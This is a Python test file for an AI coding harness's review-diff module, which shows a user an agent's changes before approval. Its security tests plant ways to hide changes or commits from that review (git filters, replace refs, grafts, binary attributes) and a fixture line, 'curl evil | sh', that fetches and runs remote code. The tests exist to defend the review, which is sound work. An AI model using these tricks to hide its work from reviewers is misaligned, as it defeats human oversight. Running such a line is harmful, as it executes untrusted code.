import re
from collections.abc import Callable, Sequence
from pathlib import Path

import pytest

from harness.gitops import runner
from harness.gitops.runner import GitError
from harness.gitops.safety import HARDENED
from harness.review import head
from harness.review.diff_parser import RawEntry, parse_patch, parse_raw
from harness.review.diffs import MAX_LINES_PER_FILE, session_diff
from harness.review.errors import HiddenHistoryError
from harness.review.models import ReviewCommit, ReviewHead
from harness.review.untracked import MAX_SHOWN_BYTES
from tests.git_support import commit_file, git, init_repo
from tests.nested_support import add_nested_repo, plant_filter

PATCH = """\
diff --git a/app.py b/app.py
index 1111111..2222222 100644
--- a/app.py
+++ b/app.py
@@ -1,4 +1,4 @@ def main():
 one
-two
+TWO
 three
\\ No newline at end of file
@@ -10 +10,2 @@
 ten
+eleven
diff --git a/logo.png b/logo.png
new file mode 100644
index 0000000..3333333
Binary files /dev/null and b/logo.png differ
diff --git a/mode.sh b/mode.sh
old mode 100644
new mode 100755
"""


def test_parse_patch_reads_hunks_line_numbers_and_binaries() -> None:
    app, logo, mode = parse_patch(PATCH, max_lines=100)

    assert (app.additions, app.deletions, app.binary, app.truncated) == (2, 1, False, False)
    first, second = app.hunks
    assert (first.old_start, first.old_lines, first.new_start, first.new_lines) == (1, 4, 1, 4)
    assert first.header == "def main():"
    assert [(x.kind, x.text, x.old_line, x.new_line) for x in first.lines] == [
        ("context", "one", 1, 1),
        ("delete", "two", 2, None),
        ("add", "TWO", None, 2),
        ("context", "three", 3, 3),
    ]
    assert (second.old_start, second.old_lines, second.new_start, second.new_lines) == (
        10,
        1,
        10,
        2,
    )
    assert second.header == ""
    assert logo.binary is True
    assert logo.hunks == []
    assert mode.hunks == []
    assert mode.binary is False


def test_parse_patch_truncates_long_files_but_counts_every_line() -> None:
    body = "".join(f"+line {n}\n" for n in range(10))
    patch = (
        f"diff --git a/big b/big\n--- a/big\n+++ b/big\n@@ -1,0 +1,10 @@\n{body}"
        "@@ -20 +30 @@\n-old\n+new\n"
    )

    (big,) = parse_patch(patch, max_lines=3)

    assert big.truncated is True
    assert (big.additions, big.deletions) == (11, 1)
    (hunk,) = big.hunks
    assert [line.text for line in hunk.lines] == ["line 0", "line 1", "line 2"]


def test_parse_patch_of_nothing() -> None:
    assert parse_patch("", max_lines=10) == []


def test_parse_raw() -> None:
    sha, zero = "1" * 40, "0" * 40
    output = "".join(
        f":{old} {new} {sha} {zero} {code}\0{paths}\0"
        for old, new, code, paths in (
            ("100644", "100644", "M", "a.py"),
            ("100644", "100644", "R087", "old name.py\0new name.py"),
            ("000000", "160000", "A", "b"),
            ("100755", "000000", "D", "c.py"),
            ("100644", "120000", "T", "d"),
            ("100644", "100644", "C100", "e\0f"),
        )
    )

    assert parse_raw(output) == [
        RawEntry("modified", None, "a.py", "100644", "100644"),
        RawEntry("renamed", "old name.py", "new name.py", "100644", "100644"),
        RawEntry("added", None, "b", "000000", "160000"),
        RawEntry("deleted", None, "c.py", "100755", "000000"),
        RawEntry("modified", None, "d", "100644", "120000"),
        RawEntry("added", "e", "f", "100644", "100644"),
    ]


@pytest.fixture
def repo(tmp_path: Path) -> Path:
    path = init_repo(tmp_path / "repo")
    commit_file(path, "keep.txt", "a\nb\nc\n")
    commit_file(path, "old.txt", "".join(f"row {n}\n" for n in range(20)))
    commit_file(path, "gone.txt", "bye\n")
    return path


async def test_session_diff_covers_every_kind_of_change(repo: Path) -> None:
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / "keep.txt").write_text("a\nB\nc\n", encoding="utf-8")
    git(repo, "mv", "old.txt", "new.txt")
    (repo / "gone.txt").unlink()
    (repo / "fresh.txt").write_text("one\ntwo\n", encoding="utf-8")
    (repo / "blob.bin").write_bytes(b"\x00\x01binary")
    (repo / "empty.txt").write_text("", encoding="utf-8")
    (repo / "link").symlink_to("keep.txt")
    (repo / ".gitignore").write_text("ignored.log\n", encoding="utf-8")
    (repo / "ignored.log").write_text("noise\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    by_path = {f.path: f for f in diff.files}
    assert [f.path for f in diff.files] == sorted(by_path)
    assert set(by_path) == {
        ".gitignore",
        "blob.bin",
        "empty.txt",
        "fresh.txt",
        "gone.txt",
        "keep.txt",
        "link",
        "new.txt",
    }
    assert (by_path["keep.txt"].status, by_path["keep.txt"].additions) == ("modified", 1)
    assert by_path["keep.txt"].deletions == 1
    renamed = by_path["new.txt"]
    assert (renamed.status, renamed.old_path, renamed.hunks) == ("renamed", "old.txt", [])
    assert (by_path["gone.txt"].status, by_path["gone.txt"].deletions) == ("deleted", 1)
    fresh = by_path["fresh.txt"]
    assert (fresh.status, fresh.additions, fresh.deletions) == ("added", 2, 0)
    (hunk,) = fresh.hunks
    assert (hunk.old_start, hunk.old_lines, hunk.new_start, hunk.new_lines) == (0, 0, 1, 2)
    assert [(x.kind, x.text, x.new_line) for x in hunk.lines] == [
        ("add", "one", 1),
        ("add", "two", 2),
    ]
    assert (by_path["blob.bin"].binary, by_path["blob.bin"].hunks) == (True, [])
    assert (by_path["empty.txt"].additions, by_path["empty.txt"].hunks) == (0, [])
    assert [x.text for x in by_path["link"].hunks[0].lines] == ["keep.txt"]
    assert diff.base == base
    assert (diff.stats.files, diff.stats.additions) == (8, 5)
    assert diff.stats.deletions == 2
    # The index is never touched: the untracked files are still untracked.
    assert "?? fresh.txt" in git(repo, "status", "--porcelain")


async def test_untracked_files_are_truncated_too(repo: Path) -> None:
    (repo / "long.txt").write_text("x\n" * 5000, encoding="utf-8")

    diff = await session_diff(repo, git(repo, "rev-parse", "HEAD").strip())

    (long,) = diff.files
    assert long.truncated is True
    assert long.additions == 5000
    assert sum(len(h.lines) for h in long.hunks) < 5000


async def test_without_a_base_everything_is_new(tmp_path: Path) -> None:
    repo = tmp_path / "fresh"
    repo.mkdir()
    git(repo, "init", "-q")
    (repo / "a.txt").write_text("hi\n", encoding="utf-8")

    diff = await session_diff(repo, None)

    assert [(f.path, f.status) for f in diff.files] == [("a.txt", "added")]
    assert diff.base is None


async def test_a_clean_tree_has_no_files(repo: Path) -> None:
    diff = await session_diff(repo, git(repo, "rev-parse", "HEAD").strip())

    assert diff.files == []
    assert (diff.stats.files, diff.stats.additions, diff.stats.deletions) == (0, 0, 0)


async def test_an_unknown_base_is_a_git_error(repo: Path) -> None:
    with pytest.raises(GitError):
        await session_diff(repo, "0" * 40)


async def test_planted_filters_textconv_and_fsmonitor_never_run_for_a_diff(
    repo: Path, tmp_path: Path
) -> None:
    """D050: the diff runs with the user's credentials after every turn and on approval."""
    marker = tmp_path / "ran"
    program = f"sh -c 'echo ran >> {marker}; cat'"
    commit_file(repo, "notes.txt", "one\n")
    base = git(repo, "rev-parse", "HEAD").strip()
    git(repo, "config", "filter.Evil.Driver.clean", program)
    git(repo, "config", "filter.Evil.Driver.smudge", program)
    git(repo, "config", "filter.Evil.Driver.required", "true")
    git(repo, "config", "diff.evil.textconv", program)
    git(repo, "config", "core.fsmonitor", program)
    (repo / ".gitattributes").write_text("*.txt filter=Evil.Driver diff=evil\n", encoding="utf-8")
    (repo / "notes.txt").write_text("one\ntwo\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    assert not marker.exists()
    notes = next(f for f in diff.files if f.path == "notes.txt")
    assert (notes.additions, notes.deletions) == (1, 0)


async def test_a_filter_driver_that_cannot_be_switched_off_stops_the_diff(repo: Path) -> None:
    base = git(repo, "rev-parse", "HEAD").strip()
    git(repo, "config", "filter.a=b.clean", "evil")

    with pytest.raises(GitError, match="cannot be switched off"):
        await session_diff(repo, base)


async def test_a_file_replaced_by_a_symlink_is_one_change(repo: Path) -> None:
    """BUG-01: git lists a typechange once but patches it as a deletion and an addition."""
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / "keep.txt").unlink()
    (repo / "keep.txt").symlink_to("old.txt")
    (repo / "gone.txt").write_text("bye\nfor now\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    gone, keep = diff.files
    assert (keep.path, keep.status, keep.additions, keep.deletions) == (
        "keep.txt",
        "modified",
        1,
        3,
    )
    assert [line.text for hunk in keep.hunks for line in hunk.lines] == ["a", "b", "c", "old.txt"]
    assert (gone.path, gone.additions, gone.deletions) == ("gone.txt", 1, 0)


async def test_an_untracked_nested_repository_is_listed_as_a_folder(repo: Path) -> None:
    """BUG-01: an agent may clone a repository into the tree."""
    base = git(repo, "rev-parse", "HEAD").strip()
    init_repo(repo / "lib")
    (repo / "fresh.txt").write_text("one\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    fresh, nested = diff.files
    assert (nested.path, nested.status, nested.additions, nested.hunks) == ("lib/", "added", 0, [])
    # BUG-65: shown as a repository of its own, which harness will not commit.
    assert (nested.nested_repository, fresh.nested_repository) == (True, False)
    assert (fresh.path, fresh.additions) == ("fresh.txt", 1)


async def test_unusual_paths_get_their_own_changes(repo: Path) -> None:
    """Patch sections are matched to files by path, also where git quotes the path."""
    tabbed, cafe, spaced = "tab\there.txt", 'caf\u00e9 "q".txt', "x b/y.txt"
    (repo / "x b").mkdir()
    rows = "".join(f"{n}\n" for n in range(10))
    for name in (tabbed, cafe, spaced):
        (repo / name).write_text(rows, encoding="utf-8")
        git(repo, "add", name)
    git(repo, "commit", "-q", "-m", "unusual names")
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / spaced).write_text(f"{rows}more\n", encoding="utf-8")
    (repo / cafe).write_text(rows[2:], encoding="utf-8")
    (repo / "\u00fcber").mkdir()
    moved = "\u00fcber/tab\there.txt"
    git(repo, "mv", tabbed, moved)
    (repo / moved).write_text(f"{rows}more\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    by_path = {f.path: f for f in diff.files}
    assert set(by_path) == {spaced, cafe, moved}
    assert (by_path[spaced].additions, by_path[spaced].deletions) == (1, 0)
    assert (by_path[cafe].additions, by_path[cafe].deletions) == (0, 1)
    renamed = by_path[moved]
    assert (renamed.status, renamed.old_path) == ("renamed", tabbed)
    assert (renamed.additions, renamed.deletions) == (1, 0)


@pytest.mark.parametrize(
    "settings",
    [
        [("diff.noprefix", "true")],
        [("diff.mnemonicPrefix", "true")],
        [("diff.srcPrefix", "x/"), ("diff.dstPrefix", "y/")],
    ],
)
async def test_diff_prefix_settings_never_blank_a_change(
    repo: Path, settings: list[tuple[str, str]]
) -> None:
    """BUG-52: the agent may set these with an allowed `git config`; the user may have them."""
    base = git(repo, "rev-parse", "HEAD").strip()
    for key, value in settings:
        git(repo, "config", key, value)
    (repo / "keep.txt").write_text("a\nB\nc\n", encoding="utf-8")
    spaced = repo / "with space \u00e9.txt"
    spaced.write_text("one\n", encoding="utf-8")
    git(repo, "add", spaced.name)
    git(repo, "commit", "-q", "-m", "quoted name")
    spaced.write_text("one\ntwo\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    by_path = {f.path: f for f in diff.files}
    assert (by_path["keep.txt"].additions, by_path["keep.txt"].deletions) == (1, 1)
    assert len(by_path["keep.txt"].hunks) == 1
    assert (by_path[spaced.name].additions, len(by_path[spaced.name].hunks)) == (2, 1)


async def test_the_diff_names_head_and_its_branch(repo: Path) -> None:
    head = git(repo, "rev-parse", "HEAD").strip()

    diff = await session_diff(repo, head)
    git(repo, "checkout", "-q", "--detach")
    detached = await session_diff(repo, head)

    assert diff.head == ReviewHead(commit=head, branch="main")
    assert detached.head == ReviewHead(commit=head, branch=None)


async def test_a_repository_without_commits_has_no_head(tmp_path: Path) -> None:
    repo = tmp_path / "fresh"
    repo.mkdir()
    git(repo, "init", "-q", "-b", "main")

    diff = await session_diff(repo, None)

    assert diff.head == ReviewHead(commit=None, branch="main")
    assert diff.commits == []


async def test_commits_the_base_and_the_published_work_do_not_hold_are_listed(repo: Path) -> None:
    """SEC-02: a commit made behind the review's back is shown, whatever made it."""
    base = git(repo, "rev-parse", "HEAD").strip()
    published = commit_file(repo, "approved.txt")
    hidden = commit_file(repo, "hidden.txt")
    second = commit_file(repo, "also hidden.txt")

    diff = await session_diff(repo, base, published)
    nothing_published = await session_diff(repo, base)
    without_base = await session_diff(repo, None)

    assert diff.commits == [
        ReviewCommit(sha=second, subject="add also hidden.txt"),
        ReviewCommit(sha=hidden, subject="add hidden.txt"),
    ]
    assert [c.sha for c in nothing_published.commits] == [second, hidden, published]
    assert len(without_base.commits) == 7
    assert without_base.commits[-1] == ReviewCommit(
        sha=git(repo, "rev-list", "--max-parents=0", "HEAD").strip(), subject="init"
    )
    assert (await session_diff(repo, base, second)).commits == []


async def test_replace_refs_hide_neither_changes_nor_commits(repo: Path) -> None:
    """`git replace` (allowed by the git guard) could make the base look like the work, or
    the work's commits look like the base's; the daemon's git reads the real objects.
    """
    base = git(repo, "rev-parse", "HEAD").strip()
    hidden = commit_file(repo, "keep.txt", "a\nB\nc\n")
    git(repo, "replace", "--graft", base, hidden)
    (repo / "notes.txt").write_text("new\n", encoding="utf-8")
    original = git(repo, "rev-parse", f"{base}:old.txt").strip()
    planted = git(repo, "hash-object", "-w", "notes.txt").strip()
    git(repo, "replace", original, planted)
    (repo / "old.txt").write_text("new\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    assert [c.sha for c in diff.commits] == [hidden]
    by_path = {f.path: f for f in diff.files}
    assert by_path["old.txt"].deletions == 20
    assert by_path["keep.txt"].additions == 1


async def test_reading_head_reports_unexpected_git_failures(
    repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    async def failing(args: Sequence[str], cwd: Path) -> str:
        raise GitError(args, 128, "fatal: bad object HEAD")

    monkeypatch.setattr(head, "run_git", failing)

    with pytest.raises(GitError, match="bad object"):
        await session_diff(repo, git(repo, "rev-parse", "HEAD").strip())


async def test_every_git_command_of_a_diff_is_hardened(
    repo: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """SEC-17: the config listing too, not only the commands that read the tree."""
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / "keep.txt").write_text("a\nB\nc\n", encoding="utf-8")
    (repo / "fresh.txt").write_text("new\n", encoding="utf-8")
    commands: list[Sequence[str]] = []
    real = runner.run_command

    async def recording(argv: Sequence[str], cwd: Path, time_limit: float = 300.0) -> str:
        commands.append(argv)
        return await real(argv, cwd, time_limit)

    monkeypatch.setattr(runner, "run_command", recording)

    await session_diff(repo, base)

    assert len(commands) > 3
    assert [argv for argv in commands if tuple(argv[1 : 1 + len(HARDENED)]) != HARDENED] == []


async def test_a_filter_planted_in_a_nested_repository_never_runs_for_a_diff(
    repo: Path, tmp_path: Path
) -> None:
    """SEC-08: git would run `status` inside a submodule or nested repository, with its
    own config, which the agent can write.
    """
    nested = add_nested_repo(repo)
    base = git(repo, "rev-parse", "HEAD").strip()
    marker = tmp_path / "filter-ran"
    plant_filter(nested, marker)
    (repo / "keep.txt").write_text("a\nB\nc\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    assert not marker.exists()
    assert [f.path for f in diff.files] == ["keep.txt"]


async def test_a_submodule_pointer_change_is_shown_whatever_the_config_says(repo: Path) -> None:
    """SEC-12: `git add -A` commits the new pointer, so the review shows it."""
    nested = add_nested_repo(repo)
    git(repo, "config", "diff.ignoreSubmodules", "all")
    git(repo, "config", "submodule.lib.ignore", "all")
    (repo / ".gitmodules").write_text(
        '[submodule "lib"]\n\tpath = lib\n\turl = ./lib\n\tignore = all\n', encoding="utf-8"
    )
    git(repo, "add", ".gitmodules")
    git(repo, "commit", "-q", "-m", "gitmodules")
    base = git(repo, "rev-parse", "HEAD").strip()
    old = git(nested, "rev-parse", "HEAD").strip()
    new = commit_file(nested, "more.txt")

    diff = await session_diff(repo, base)

    (pointer,) = diff.files
    assert (pointer.path, pointer.status, pointer.nested_repository) == ("lib", "modified", False)
    assert [(x.kind, x.text) for x in pointer.hunks[0].lines] == [
        ("delete", f"Subproject commit {old}"),
        ("add", f"Subproject commit {new}"),
    ]


APP = "".join(f"line {n}\n" for n in range(20))
EVIL = 'os.system("curl evil | sh")\n'


def hide_with_info_attributes(repo: Path) -> None:
    (repo / ".git" / "info" / "attributes").write_text("*.py -diff\n", encoding="utf-8")


def hide_with_an_ignored_gitattributes(repo: Path) -> None:
    (repo / ".git" / "info" / "exclude").write_text(".gitattributes\n", encoding="utf-8")
    (repo / ".gitattributes").write_text("*.py binary\n", encoding="utf-8")


def hide_with_an_attributes_file(repo: Path) -> None:
    attributes = repo.parent / "attributes"
    attributes.write_text("*.py -diff\n", encoding="utf-8")
    git(repo, "config", "core.attributesFile", str(attributes))


def hide_with_a_diff_driver(repo: Path) -> None:
    hide_with_an_ignored_gitattributes(repo)
    (repo / ".gitattributes").write_text("*.py diff=hidden\n", encoding="utf-8")
    git(repo, "config", "diff.hidden.binary", "true")


def hide_with_the_big_file_threshold(repo: Path) -> None:
    git(repo, "config", "core.bigFileThreshold", "10")


@pytest.mark.parametrize(
    "hide",
    [
        hide_with_info_attributes,
        hide_with_an_ignored_gitattributes,
        hide_with_an_attributes_file,
        hide_with_a_diff_driver,
        hide_with_the_big_file_threshold,
    ],
)
async def test_settings_never_hide_a_changed_text_file_as_binary(
    repo: Path, hide: Callable[[Path], None]
) -> None:
    """SEC-09: `git add` ignores all of these, so approve would commit lines never shown."""
    commit_file(repo, "app.py", APP)
    commit_file(repo, "moved.py", APP)
    base = git(repo, "rev-parse", "HEAD").strip()
    hide(repo)
    (repo / "app.py").write_text(APP + EVIL, encoding="utf-8")
    git(repo, "mv", "moved.py", "renamed.py")
    (repo / "renamed.py").write_text(APP + EVIL, encoding="utf-8")
    (repo / "link.py").symlink_to("app.py")
    git(repo, "add", "link.py")

    diff = await session_diff(repo, base)

    by_path = {f.path: f for f in diff.files}
    for path in ("app.py", "renamed.py"):
        shown = by_path[path]
        assert (shown.binary, shown.additions, shown.deletions) == (False, 1, 0), path
        assert [x.text for h in shown.hunks for x in h.lines if x.kind == "add"] == [EVIL.strip()]
    assert by_path["renamed.py"].old_path == "moved.py"
    assert [x.text for h in by_path["link.py"].hunks for x in h.lines] == ["app.py"]


async def test_binary_files_are_still_binary(repo: Path) -> None:
    """Only harness's own test decides: a NUL byte near the start of the file."""
    for name in ("logo.png", "tail.txt"):
        commit_file(repo, name, "placeholder\n")
    commit_file(repo, "doomed.bin", "\0gone")
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / ".git" / "info" / "attributes").write_text("* -diff\n", encoding="utf-8")
    (repo / "logo.png").write_bytes(b"\x89PNG\r\n\x00\x00" + b"x\n" * 10)
    (repo / "doomed.bin").unlink()
    # A NUL byte past the part git's own test reads leaves a file text.
    (repo / "tail.txt").write_bytes(b"line\n" * 2000 + b"\x00\n")

    diff = await session_diff(repo, base)

    by_path = {f.path: f for f in diff.files}
    assert (by_path["logo.png"].binary, by_path["logo.png"].hunks) == (True, [])
    assert (by_path["doomed.bin"].status, by_path["doomed.bin"].binary) == ("deleted", True)
    tail = by_path["tail.txt"]
    assert (tail.binary, tail.additions, tail.deletions) == (False, 2001, 1)


def plant_graft(repo: Path, work: str, base: str) -> None:
    (repo / ".git" / "info" / "grafts").write_text(f"{work} {base}\n", encoding="utf-8")


def plant_shallow(repo: Path, work: str, base: str) -> None:
    (repo / ".git" / "shallow").write_text(f"{work}\n", encoding="utf-8")


@pytest.mark.parametrize("plant", [plant_graft, plant_shallow])
async def test_history_cut_to_hide_a_commit_stops_the_review(
    repo: Path, plant: Callable[[Path, str, str], None]
) -> None:
    """SEC-13: grafts and shallow boundaries make git skip commits, replace refs or not."""
    base = git(repo, "rev-parse", "HEAD").strip()
    commit_file(repo, "secret.txt")
    work = commit_file(repo, "work.txt")
    plant(repo, work, base)

    with pytest.raises(HiddenHistoryError) as caught:
        await session_diff(repo, base)

    assert caught.value.status_code == 409
    assert caught.value.payload() == {"detail": str(caught.value), "code": "hidden_history"}
    assert "Terminal" in str(caught.value)


async def test_an_empty_grafts_file_hides_nothing(repo: Path) -> None:
    base = git(repo, "rev-parse", "HEAD").strip()
    work = commit_file(repo, "work.txt")
    (repo / ".git" / "info" / "grafts").write_text("\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    assert [c.sha for c in diff.commits] == [work]


async def test_a_shallow_clone_is_reviewed_as_usual(repo: Path, tmp_path: Path) -> None:
    clone = tmp_path / "clone"
    git(tmp_path, "clone", "-q", "--depth", "1", f"file://{repo}", str(clone))
    base = git(clone, "rev-parse", "HEAD").strip()
    work = commit_file(clone, "work.txt")

    diff = await session_diff(clone, base)

    assert [c.sha for c in diff.commits] == [work]


async def test_a_repository_the_agent_staged_itself_is_flagged(repo: Path) -> None:
    """SEC-14: `git add lib` stages a gitlink that points nowhere once pushed."""
    base = git(repo, "rev-parse", "HEAD").strip()
    init_repo(repo / "lib")
    git(repo, "-c", "advice.addEmbeddedRepo=false", "add", "lib")

    diff = await session_diff(repo, base)

    (staged,) = diff.files
    assert (staged.path, staged.status, staged.nested_repository) == ("lib", "added", True)


@pytest.mark.parametrize(("ignored", "flagged"), [(False, False), (True, True)])
async def test_a_new_submodule_named_in_gitmodules_is_not_flagged(
    repo: Path, ignored: bool, flagged: bool
) -> None:
    """A `.gitmodules` that is ignored is never committed, so it does not count."""
    base = git(repo, "rev-parse", "HEAD").strip()
    init_repo(repo / "lib")
    git(repo, "-c", "advice.addEmbeddedRepo=false", "add", "lib")
    (repo / ".gitmodules").write_text(
        '[submodule "lib"]\n\tpath = lib\n\turl = https://example.com/lib.git\n',
        encoding="utf-8",
    )
    if ignored:
        (repo / ".git" / "info" / "exclude").write_text(".gitmodules\n", encoding="utf-8")

    diff = await session_diff(repo, base)

    lib = next(f for f in diff.files if f.path == "lib")
    assert lib.nested_repository is flagged


async def test_a_gitmodules_git_cannot_read_declares_nothing(repo: Path) -> None:
    base = git(repo, "rev-parse", "HEAD").strip()
    init_repo(repo / "lib")
    git(repo, "-c", "advice.addEmbeddedRepo=false", "add", "lib")
    (repo / ".gitmodules").write_text('[submodule "lib"\n\tpath = lib\n', encoding="utf-8")

    diff = await session_diff(repo, base)

    assert next(f for f in diff.files if f.path == "lib").nested_repository is True


async def test_the_fingerprint_is_a_sha256_that_stays_while_nothing_changes(repo: Path) -> None:
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / "keep.txt").write_text("a\nB\nc\n", encoding="utf-8")
    (repo / "fresh.txt").write_text("new\n", encoding="utf-8")

    first = await session_diff(repo, base)
    second = await session_diff(repo, base)

    assert re.fullmatch(r"[0-9a-f]{64}", first.fingerprint)
    assert first.fingerprint == second.fingerprint
    assert (await session_diff(repo, base, base)).fingerprint == first.fingerprint


def rewrite_line(path: Path, number: int, text: str) -> None:
    lines = path.read_text(encoding="utf-8").splitlines(keepends=True)
    lines[number] = text
    path.write_text("".join(lines), encoding="utf-8")


MUTATIONS: dict[str, Callable[[Path], object]] = {
    "a shown line": lambda repo: rewrite_line(repo / "keep.txt", 1, "b\n"),
    "a line past the shown ones": lambda repo: rewrite_line(
        repo / "long.txt", MAX_LINES_PER_FILE + 500, "LATER\n"
    ),
    "untracked content past the shown part": lambda repo: (repo / "dump.txt").write_bytes(
        b"y" * (2 * MAX_SHOWN_BYTES) + b"Z"
    ),
    "a binary file": lambda repo: (repo / "blob.bin").write_bytes(b"\x00two"),
    "a file mode": lambda repo: (repo / "old.txt").chmod(0o755),
    "the head": lambda repo: commit_file(repo, "other.txt"),
    "the branch": lambda repo: git(repo, "checkout", "-q", "-b", "elsewhere"),
}


@pytest.mark.parametrize("mutation", MUTATIONS.values(), ids=MUTATIONS.keys())
async def test_the_fingerprint_changes_with_anything_approving_would_publish(
    repo: Path, mutation: Callable[[Path], object]
) -> None:
    """The review fingerprint ties an approval to the review the user saw."""
    commit_file(repo, "long.txt", "".join(f"{n}\n" for n in range(3000)))
    commit_file(repo, "blob.bin", "\0one")
    base = git(repo, "rev-parse", "HEAD").strip()
    (repo / "keep.txt").write_text("a\nB\nc\n", encoding="utf-8")
    (repo / "long.txt").write_text("".join(f"{n}!\n" for n in range(3000)), encoding="utf-8")
    (repo / "dump.txt").write_bytes(b"y" * (2 * MAX_SHOWN_BYTES) + b"y")
    (repo / "blob.bin").write_bytes(b"\x00one")
    before = await session_diff(repo, base)

    mutation(repo)
    after = await session_diff(repo, base)

    assert after.fingerprint != before.fingerprint
